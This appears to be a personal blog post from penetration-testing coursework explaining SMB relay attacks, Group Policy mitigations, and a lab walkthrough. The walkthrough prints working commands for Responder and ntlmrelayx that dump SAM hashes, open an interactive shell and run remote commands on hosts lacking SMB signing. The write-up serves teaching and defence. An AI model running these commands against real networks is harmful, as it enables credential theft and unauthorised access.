---
title: "Understanding SMB Relay Attacks and Mitigation Techniques"
date: 2024-07-22
toc: true
toc_label: "Table of Contents"
toc_icon: "list-alt"
categories:
  - Blog
tags:
  - Cybersecurity
  - Offensive
  - Red Team
  - Penetration Testing
  - Ethical Hacking
  - Active Directory
  - SMB

 
tagline: "Secure Your Network: Uncovering SMB Relay Attacks and Effective Mitigation Strategies."
header:
  teaser: assets/images/tcm-academy/smb-relay-0.png
  overlay_filter: rgba(0, 0, 0, 0.5)
  overlay_image: /assets/images/tcm-academy/smb-relay-0.png
  caption: "Photo credit: [**AI**](https://chatgpt.com/)"
---

## Introduction

In the world of network security, understanding various attack vectors is critical to safeguarding systems and data. One such attack is the SMB (Server Message Block) Relay attack, which exploits vulnerabilities in the SMB protocol commonly used in Windows environments. This article will explore what an SMB Relay attack is, the steps involved in executing such an attack, and mitigation strategies to reduce the associated risks. Additionally, I will include screenshots and steps from my lab demonstration using the Responder tool and NTLM Relay X.

<img src="/assets/images/tcm-academy/SMB_relay_attack_featured_image.png">

## What is an SMB Relay Attack?

An SMB Relay attack is a type of Man-in-the-Middle (MitM) attack where an attacker intercepts and relays SMB authentication requests to a target server. This allows the attacker to authenticate themselves on behalf of the victim without knowing their credentials. The attack takes advantage of weak or misconfigured SMB services that allow for relay attacks, particularly when SMB signing is not enforced.



## Steps Involved in an SMB Relay Attack

1. **Identify Hosts without SMB Signing**:
   - The attacker scans the network to identify hosts that do not have SMB signing enforced, making them vulnerable to relay attacks.

2. **Attacker Configures Responder to Relay Requests**:
   - The attacker sets up the Responder tool to capture and relay SMB authentication requests on the network.

3. **Run Responder**:
   - The attacker runs Responder to listen for and capture SMB authentication requests from network hosts.

4. **Attacker Setup Relay X**:
   - The attacker configures NTLM Relay X to relay the captured authentication requests to the target server.

5. **A Triggering Event Occurs**:
   - An event, such as a user attempting to access a network resource, triggers the SMB authentication process.
   - The attacker intercepts and relays the authentication request using NTLM Relay X.

6. **Relay Side: Hashes of the SAM Get Dumped**:
   - The relayed authentication request results in the dumping of hashes from the Security Account Manager (SAM) database on the target server.
   - The attacker can crack these hashes to reveal passwords.

7. **Interactive Shell with -i Command**:
   - The attacker can create an interactive shell using the `-i` command with NTLM Relay X, allowing for direct interaction with the target system.

8. **Send Commands with -c Option**:
   - The attacker can send specific commands to the target system by adding the `-c` option to NTLM Relay X.

## Mitigation Strategies for SMB Relay Attacks

1. **Enforce SMB Signing**:
   - Enabling SMB signing on all systems ensures that SMB packets are digitally signed, preventing tampering and relay attacks.
   - This can be configured via Group Policy:
     - `Computer Configuration -> Policies -> Windows Settings -> Security Settings -> Local Policies -> Security Options`
     - Enable "Microsoft network client: Digitally sign communications (always)" and "Microsoft network server: Digitally sign communications (always)".
     <img src="/assets/images/tcm-academy/smb-relay-1.jpg">

2. **Disable SMBv1**:
   - SMBv1 is an older version of the SMB protocol that is more susceptible to attacks. Disabling it reduces the attack surface.
   - This can be done via <a href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3?tabs=server#disable-smbv1-by-using-group-policy">Group Policy</a> or through Windows <a href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3?tabs=server">features settings</a>.

3. **Use Strong Authentication Methods**:
   - Implement multi-factor authentication (MFA) to add an extra layer of security, making it harder for attackers to exploit relayed credentials.

4. **Segment the Network**:
   - Network segmentation limits the spread of an attack by isolating essential systems and services from the rest of the network.

5. **Regularly Update and Patch Systems**:
   - Keep all systems and software up-to-date with the latest security patches to protect against known vulnerabilities.

6. **Monitor and Detect**:
   - Use network monitoring tools to detect unusual activities and potential MitM attacks.
   - Implement alerting mechanisms to respond quickly to suspicious behavior.

## Lab Demonstration: SMB Relay Attack Using Responder and NTLM Relay X

Below are the steps and screenshots from my lab demonstration of an SMB Relay attack:

1. **Identify Hosts without SMB Signing Enabled and Enforced**: Scanned the network to find vulnerable hosts.

```
nmap --script=smb2-security-mode.nse -445 <target IP address> -Pn
```

   ![Identify Hosts](/assets/images/tcm-academy/smb-relay-2.png)

2. **Create a targets file**

```
sudo nano target.txt
```
   ![Identify Hosts](/assets/images/tcm-academy/smb-relay-3.png)


3. **Configure Responder to Relay Requests**: Set up Responder to capture and relay SMB authentication requests.

```
sudo mousepad /etc/responder/Responder.conf
```

   ![Configure Responder](/assets/images/tcm-academy/smb-relay-4.png)


Switch off SMB and HTTP

<img src="/assets/images/tcm-academy/smb-relay-5.png">


4. **Run Responder**: Executed Responder to listen for SMB authentication attempts.

```
sudo responder -I eth0
```

   ![Run Responder](/assets/images/tcm-academy/smb-relay-6.png)

5. **Setup NTLM Relay X**: Configured NTLM Relay X to relay captured credentials to the target server.

```
sudo python3 ntlmrelayx.py -smb2support -tf targets.txt 
```

   ![Setup Relay X](/assets/images/tcm-academy/smb-relay-7.png)

6. **Triggering Event**: Captured SMB authentication request when a user tried to access a network resource.
   ![Triggering Event](/assets/images/tcm-academy/smb-relay-8.png)

   <img src="/assets/images/tcm-academy/smb-relay-9.png">

7. **Dump SAM Hashes**: Relayed the authentication request and dumped the hashes from the SAM database.
   ![Dump SAM Hashes](/assets/images/tcm-academy/smb-relay-10.png)

8. **Interactive Shell**: Created an interactive shell using the `-i` command.

```
ntlmrelayx.py -tf targets.txt -smb2support -i
```

   ![Interactive Shell](/assets/images/tcm-academy/smb-relay-11.png)


 <img src="/assets/images/tcm-academy/smb-relay-12.png">     


9. **Send Commands**: Sent specific commands to the target system using the `-c` option.

```
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```



   ![Send Commands](/assets/images/tcm-academy/smb-relay-13.png)

## Conclusion

Understanding and mitigating SMB Relay attacks is critical for maintaining the security of networked systems. By enforcing SMB signing, disabling SMBv1, using strong authentication methods, segmenting the network, keeping systems updated, and monitoring network activities, organizations can significantly reduce the risk of such attacks. The lab demonstration provided practical insights into how these attacks are executed and the importance of implementing robust security measures.

Feel free to reach out with any questions or comments on this topic. Stay secure!

